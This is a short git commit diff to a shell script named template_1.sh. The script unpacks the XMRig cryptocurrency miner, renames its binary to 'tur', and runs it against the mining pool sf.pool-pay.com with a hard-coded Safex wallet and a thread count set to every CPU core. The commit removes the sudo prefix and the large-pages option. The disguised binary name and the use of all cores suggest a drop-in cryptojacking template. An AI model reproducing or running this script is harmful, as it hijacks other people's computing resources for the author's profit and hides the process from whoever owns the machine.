2d64138a2533534d3003854af7ef3134c0484040
Rickyose <rickyhaterearged@gmail.com>
2022-04-15 09:22:06 +0700

    Update template_1.sh

--- template/template_1.sh
+++ template/template_1.sh
@@ -5,4 +5,4 @@ tar xf xmrig-6.17.0-linux-static-x64.tar.gz
 cd xmrig-6.17.0
 mv xmrig tur
 
-sudo ./tur -o sf.pool-pay.com:4025 --randomx-1gb-pages -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx
+./tur -o sf.pool-pay.com:4025 -t $(( `cat /proc/cpuinfo | grep processor | wc -l` )) -u Safex5zhXacGgZP8xw2a9tEHsobwVB5tS2sh2pPC9ZFWT6hX5hofxj1PF3D41Fvgo8eWUwVcm1cJRavwmutMKtncWcS36GNkVtj38 -k -a rx/sfx
